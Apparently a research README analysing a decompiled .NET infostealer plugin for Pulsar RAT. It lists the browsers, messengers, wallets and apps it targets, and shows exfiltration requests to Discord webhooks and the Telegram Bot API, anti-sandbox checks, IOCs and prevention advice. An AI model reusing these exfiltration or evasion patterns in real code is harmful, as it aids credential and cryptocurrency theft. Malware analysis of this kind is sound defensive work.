# Xorium Stealer Pulsar - Malware Analysis for Research Purposes

> ⚠️ **LEGAL WARNING**: This repository contains decompiled malware. The content is provided **ONLY** for research, analysis, and cybersecurity education purposes. Using this code for illegal purposes is **STRICTLY PROHIBITED** and may result in criminal prosecution.

**[🇻🇳 Vietnamese Version](README.md)**

---

## 📋 Overview

**Xorium Stealer Pulsar** is a stealer plugin designed to integrate with **Pulsar RAT** (Remote Access Trojan) - a remote control framework. This plugin was developed by `@aesxor` and has the capability to harvest sensitive data from victim machines.

### Technical Information
- **Name**: Xorium Stealer Pulsar
- **Version**: 2.1.0 (Client), 2.0.0 (Server)
- **Language**: C# (.NET Framework 4.7.2)
- **Architecture**: Plugin-based for Pulsar RAT
- **Author**: @aesxor

---

## 🏗️ System Architecture

The project is divided into 2 main components:

```
Xorium Stealer Pulsar/
├── Pulsar.Plugin.Client/          # Client - Malware running on victim machine
│   └── Stealer.Client/
│       ├── Intelix/Targets/       # Data collection modules
│       └── Pulsar/Plugins/Client/ # Plugin entry point
│
└── Pulsar.Plugin.Server/          # Server - Control plugin for Pulsar RAT
    └── Stealer.Server/
        └── Pulsar/Plugins/Server/ # Server plugin entry point
```

### Operation Flow

1. **Server Plugin** (`Stealer.Server.dll`) is loaded into Pulsar RAT
2. Operator selects client and sends "Run Stealer" command
3. Server pushes `Stealer.Client.dll` to the victim machine
4. Client executes, collects data, and exfiltrates via:
   - Discord Webhook
   - Telegram Bot API
   - Directly back to Pulsar Server

---

## 🎯 Collection Targets

### 1. 🌐 Browsers
| Type | Supported Browsers |
|------|-------------------|
| **Chromium-based** | Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Chromium |
| **Gecko-based** | Firefox, Waterfox, Pale Moon, SeaMonkey |

**Collected Data:**
- Browsing history
- Cookies (including session cookies)
- Saved passwords (decrypted from DPAPI)
- Credit cards (decrypted)
- AutoFill data
- Authentication tokens

### 2. 💬 Messaging Applications
- **Discord** - Tokens, user data
- **Telegram** - Session files, settings
- **Signal** - Configuration, local data
- **Skype** - Credentials, history
- **Viber** - Session data
- **Element (Riot.im)** - Configuration
- **ICQ** - User data
- **Pidgin** - Account settings
- **Tox** - Profile data
- **Outlook** - Email credentials
- **MicroSIP** - VoIP settings
- **Jabber** - IM credentials

### 3. 🎮 Gaming Platforms
| Game | Collected Data |
|------|---------------|
| **Steam** | Login credentials, session files, config |
| **Epic Games** | Account data, session |
| **Battle.net** | Credentials, game configs |
| **Riot Games** (Valorant, LoL) | Session tokens |
| **Roblox** | Cookies, login data |
| **Minecraft** | Session files, credentials |
| **Uplay (Ubisoft)** | Login data |
| **Xbox** | Account credentials |
| **Growtopia** | Save data |
| **Electronic Arts** | Session, credentials |

### 4. 🔐 VPN Clients
- NordVPN, ExpressVPN, ProtonVPN
- CyberGhost, Mullvad, PIA (Private Internet Access)
- OpenVPN, WireGuard, SoftEther
- Hamachi, RadminVPN, SurfShark
- IPVanish, HideMyName, Cisco AnyConnect
- Proxifier

### 5. 💰 Cryptocurrency Wallets

**Desktop Wallets:**
- Bitcoin Core, Electrum, Exodus
- Ethereum (keystore files)
- Atomic Wallet, Coinomi, Guarda
- Jaxx, Armory, Zcash
- Bytecoin, Dash Core
- Tari Universe

**Browser Extension Wallets:**
- MetaMask, Phantom, Trust Wallet
- Coinbase Wallet, Binance Wallet
- Ronin Wallet, Brave Wallet
- TronLink, Yoroi, Nami
- Math Wallet, XDEFI, Guarda
- Equal, BitAppWallet, iWallet
- Wombat, AtomicNFT, MewCx
- GuildWallet, Saturn, Ronin

### 6. 🖥️ System Information
- **SystemInfo** - OS version, hardware specs, username, hostname
- **ScreenShot** - Desktop screenshot capture
- **ProcessDump** - List of running processes
- **ProductKey** - Windows product key
- **WifiKey** - Saved WiFi passwords
- **InstalledPrograms** - List of installed software
- **InstalledBrowsers** - List of browsers

### 7. 🛠️ Other Applications

**Remote Access:**
- AnyDesk, TeamViewer, RDP
- RDCMan, Sunlogin, MobaXterm
- Xmanager, PuTTY

**FTP/SCP Clients:**
- FileZilla, WinSCP, CyberDuck
- CoreFTP, FTPNavigator, FTPRush
- FTPGetter, FTPCommander, TotalCommander

**Development/DevOps:**
- JetBrains IDEs (config, licenses)
- GitHub Desktop, Ngrok
- Navicat, No-IP, DynDNS
- OBS, TeamSpeak, PlayIt

---

## 🔧 Technical Mechanisms

### DPAPI Decryption (Data Protection API)
```csharp
// Extract Master Key from Local State
byte[] masterv10 = LocalState.MasterKeyV10(localstate);
byte[] masterv20 = LocalState.MasterKeyV20(localstate);
```

The malware uses DPAPI to decrypt browser encrypted data:
- Passwords stored in `Login Data` SQLite database
- Cookies in `Cookies` or `Network/Cookies`
- Credit cards in `Web Data`

### SQLite Database Parsing
Uses custom SQLite parser to read data from browser database files without locking them.

### Parallel Processing
```csharp
Task.WaitAll(Task.Run(() => Parallel.ForEach<ITarget>(
    Stealer.Targets, 
    target => target.Collect(zip, counter)
)));
```

Uses parallel processing to speed up data collection.

### Exfiltration

**Discord Webhook:**
```csharp
POST {webhookUrl}
Content-Type: multipart/form-data
- payload_json: Embed message with victim information
- file: ZIP archive containing stolen data
```

**Telegram Bot API:**
```csharp
POST https://api.telegram.org/bot{token}/sendDocument
- chat_id: {chatId}
- caption: Log metadata
- document: ZIP file
```

---

## 📊 Output Structure

Data is packaged into a ZIP file with the following structure:

```
{Username}_{ComputerName}_{YYYYMMDD}.zip
├── Browsers/
│   ├── Chrome/
│   │   ├── Passwords.txt
│   │   ├── Cookies.txt
│   │   ├── History.txt
│   │   └── CreditCards.txt
│   └── Firefox/
│       └── ...
├── Messengers/
│   ├── Discord/
│   ├── Telegram/
│   └── ...
├── Games/
│   ├── Steam/
│   ├── Epic/
│   └── ...
├── Wallets/
│   ├── Exodus/
│   ├── Electrum/
│   └── ...
├── VPN/
│   └── ...
├── Applications/
│   └── ...
├── System/
│   ├── SystemInfo.txt
│   ├── WiFiPasswords.txt
│   ├── InstalledPrograms.txt
│   └── Screenshot.png
└── counter.txt  # Summary statistics
```

---

## 🛡️ Anti-VM & Anti-Sandbox

The malware employs multiple techniques to detect and avoid running in virtualized environments (VM) or sandboxes:

### Anti-Analysis Techniques

| Technique | Description | Detection Condition |
|-----------|-------------|---------------------|
| **Processor Count Check** | Check number of CPU cores | `Environment.ProcessorCount <= 1` |
| **Debugger Detection** | Detect attached debugger | `Debugger.IsAttached` |
| **Memory Check** | Check total RAM | RAM < 2GB |
| **Drive Space Check** | Check C: drive capacity | < 50GB |
| **Cache Memory Check** | Check Win32_CacheMemory | No cache memory found |
| **CIM Memory Check** | Check CIM_Memory | No CIM memory found |
| **Process Name Check** | Check process name | Contains "sandbox" |
| **User/Machine Check** | Check username and hostname | Specific patterns |

### Detected User/Machine Patterns

```csharp
// Windows Defender Application Guard
username == "WDAGUtilityAccount"

// Common sandbox patterns
(username == "frank" && hostname.Contains("desktop"))
(username == "robert" && hostname.Contains("22h2"))
```

### Behavior When VM/Sandbox Detected

```csharp
public static void CheckOrExit()
{
    if (ProccessorCheck()) throw new Exception();
    if (CheckDebugger()) throw new Exception();
    if (CheckMemory()) throw new Exception();
    if (CheckDriveSpace()) throw new Exception();
    if (CheckUserConditions()) throw new Exception();
    if (CheckCache()) throw new Exception();
    if (CheckFileName()) throw new Exception();
    if (CheckCim()) throw new Exception();
}
```

When any condition is detected, the malware throws an exception and stops execution immediately.

---

## 🛡️ Detection & Prevention

### IOCs (Indicators of Compromise)

**File Paths:**
- `%APPDATA%\pulsar_cl_conf.bin` - Config file storing webhook/token
- `%TEMP%\*.zip` - Temporary archive files

**Registry Keys:**
- Keys related to startup persistence

**Network Indicators:**
- Discord webhook URLs: `discord.com/api/webhooks/*`
- Telegram API: `api.telegram.org/bot*/sendDocument`

### Prevention Measures

1. **Use Password Manager** - Don't save passwords in browsers
2. **Disable AutoFill** - Turn off auto-fill features
3. **2FA/MFA** - Enable two-factor authentication for all accounts
4. **Endpoint Protection** - Use modern EDR/AV solutions
5. **Application Control** - Block execution of files from unknown sources
6. **Network Monitoring** - Monitor traffic to Discord/Telegram APIs

---

## 🔬 Reverse Engineering Analysis

### Analysis Tools
- **JetBrains dotPeek** / **dnSpy** - Decompile .NET assemblies
- **ILSpy** - Open-source .NET decompiler
- **Detect It Easy (DIE)** - Identify packer/compiler
- **PEStudio** - Static analysis of PE files

### Anti-Analysis Techniques
- **Costura.Fody** - Embed dependencies into main assembly
- **Obfuscation** - String encryption, symbol renaming
- **Compressed DLLs** - Compress libraries in resources

---

## 📚 References

### About DPAPI
- [Microsoft DPAPI Documentation](https://docs.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
- [Chrome Password Decryption](https://www.hackingarticles.in/forensic-investigation-of-stored-password-in-chrome/)

### About SQLite Forensics
- [Browser Forensics](https://www.sans.org/blog/browser-forensics/)
- [Chrome Forensics](https://forensicswiki.xyz/page/Google_Chrome)

### About Pulsar RAT
- Pulsar is a popular Remote Access Trojan framework in the cybercrime community

---

## ⚖️ Disclaimer

This repository is provided for **EDUCATION AND RESEARCH** purposes:

- ✅ Analyze malware to understand how it works
- ✅ Develop prevention and detection measures
- ✅ Train cybersecurity personnel
- ✅ Academic research on cybersecurity

**DO NOT:**
- ❌ Use to attack systems without authorization
- ❌ Distribute with malicious intent
- ❌ Use for illegal commercial purposes

---

## 👤 Analysis Author

This analysis was conducted by an independent malware analyst for cybersecurity research purposes.

**Analysis Date**: 2026-01-31  
**Analysis Version**: 1.0

---

## 📞 Contact

If you discover this malware in your system:
1. Disconnect from the internet immediately
2. Use antivirus tools to scan the entire system
3. Change all passwords from a different computer
4. Check crypto applications and move assets if necessary
5. Contact a cybersecurity expert

---

*"Know your enemy to protect yourself"*
